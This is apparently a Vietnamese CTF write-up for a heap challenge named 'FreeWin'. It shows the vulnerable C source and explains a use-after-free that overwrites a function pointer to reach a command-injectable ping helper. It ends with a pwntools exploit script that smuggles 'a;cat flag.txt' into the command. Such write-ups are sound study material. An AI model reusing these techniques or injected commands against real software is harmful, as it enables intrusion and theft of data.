# source code

<details> <summary> script </summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct
{
    char header[0x20]; // Not used yet, but will be used in order to specify the type of the entry
    int (*function)(const char *);
    char *buffer;
    int size;
} * entries[0x10] = {0};

void get_str(char *buffer, int length)
{
    printf(" >> ");
    fflush(stdout);
    fgets(buffer, length, stdin);

    // Set last character to 0 if it is a newline
    size_t len = strlen(buffer);
    if (buffer[len - 1] == '\n')
        buffer[len - 1] = 0;
}

int get_int(int min, int max)
{
    char input[0x10];
    get_str(input, 0x10);

    int int_input = atoi(input);

    if (int_input > max || int_input < min)
    {
        fprintf(stderr, "Incorrect input\n");
        exit(-1);
    }
}

int menu()
{
    puts("Welcome to FreeWin !");
    puts("");
    puts("  1.  Malloc");
    puts("  2.  Free");
    puts("  3.  Edit");
    puts("  4.  Execute");
    puts("");
    fflush(stdout);

    int choice = get_int(1, 4);

    return choice;
}

void malloc_chunk()
{
    puts("Index:");
    int index = get_int(0, 0x10);

    entries[index] = malloc(sizeof(**entries));

    puts("Size:");
    entries[index]->size = get_int(0x10, 0x100);

    puts("Buffer:");
    printf("%d\n", entries[index]->size);
    entries[index]->buffer = malloc(entries[index]->size);
    get_str(entries[index]->buffer, entries[index]->size);

    // TODO: Add options on function -> Let the user choose between different functions
    entries[index]->function = puts;
}

void free_chunk()
{
    puts("Index:");
    int index = get_int(0, 0x10);

    char *buffer = entries[index]->buffer;

    free(entries[index]);
    free(buffer);
}

void edit_chunk()
{
    puts("Index:");
    int index = get_int(0, 0x10);

    puts("Buffer:");
    get_str(entries[index]->buffer, entries[index]->size);
}

void execute_chunk()
{
    puts("Index:");
    int index = get_int(0, 0x10);

    entries[index]->function(entries[index]->buffer);
}

// Not used yet, but will be used in a later version as a choice between different functions
int execute_chunk_ping(char *buffer)
{
    char cmd[0x100] = {0};
    sprintf(cmd, "ping -c 1 %s", buffer);

    system(cmd);

    return 0;
}

int main()
{
    for (int choice = menu(); choice; choice = menu())
    {
        switch (choice)
        {
        case 1:
            malloc_chunk();
            break;

        case 2:
            free_chunk();
            break;

        case 3:
            edit_chunk();
            break;

        case 4:
            execute_chunk();
            break;

        default:
            fprintf(stderr, "An error happened\n");
            fflush(stderr);
            exit(-1);
        }
    }
}
```

</details>

# Ý tưởng

- Ở đây ta thấy có hàm có thể là mục tiêu mà chúng ta nhắm đến

```c
int execute_chunk_ping(char *buffer)
{
    char cmd[0x100] = {0};
    sprintf(cmd, "ping -c 1 %s", buffer);

    system(cmd);

    return 0;
}
```

- Chúng ta chú ý một xíu về hàm free(), khi free một chunk, không hẳn chunk đó bị xoá dữ liệu, chỉ đơn giản là set chunk đó đang không hoạt động
  ![image](https://github.com/wan-hyhty/trainning/assets/111769169/c8eb94b3-2bec-48e4-a50b-ffe2ea67cf47)

- Oke, chỗ này ta chú ý `entries[index]->function = puts;` nghĩ là nó gán địa chỉ của puts vào function.
- và, khi `entries[index]->function(entries[index]->buffer);` nó sẽ tương tự như là `puts(địa chỉ buffer)`
- ở `execute_chunk_ping` ta thấy ta có thể đưa địa chỉ của hàm này vào function.

- Ta thấy nó sẽ tạo 2 chunk trong option 1, một chunk 0x40 và một chunk do size ta quyết định
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/8bf5679a-85e1-438b-92d3-9ee94364fbf9)
- thì chunk 0x40 sẽ chứa địa chỉ puts
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/0d7027c3-adb4-46f4-9266-b28274fa80c6)

- vậy ta sẽ tạo 2 chunk bất kì và free nó, khi này ta tạo 1 thêm 2 chunk có size < 0x40, khi ấy chương trình sẽ lấy ra 2 chunk 0x40 và ta có thể ghi đè được địa chỉ puts

# Khai thác

- tạo 2 chunk 0x10 byte và free chúng, sau đó tạo 1 chunk < 0x40 (để lấy chunk chứa địa chỉ puts)
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/ced35482-ec55-4bf1-b3f6-33e915d5eb1d)
- sửa payload một xíu để ta ghi đè puts()
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/18bc9ed2-43cb-43b3-b00e-6d060f623fa0)
- Bây giờ khi ta chọn option 3 nó không còn là puts nữa mà giờ nó là `execute_chunk_ping` và tham số buffer sẽ là buffer của chunks đó

```python
malloc(b"0", b"24", b"aaaaaa")
malloc(b"1", b"24", b"aaaaaa")

free(b"1")
free(b"0")

payload = b"\0" * 32 + p64(exe.sym['execute_chunk_ping'])
malloc(b"0", b"56", payload)
edit(b"1", b"a;cat flag.txt\n")

execute(b"1")
```

chall hơi lỏ lúc được lúc không ạ =((
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/76bd9768-b185-49a0-a21f-d0a3ab3b7b87)
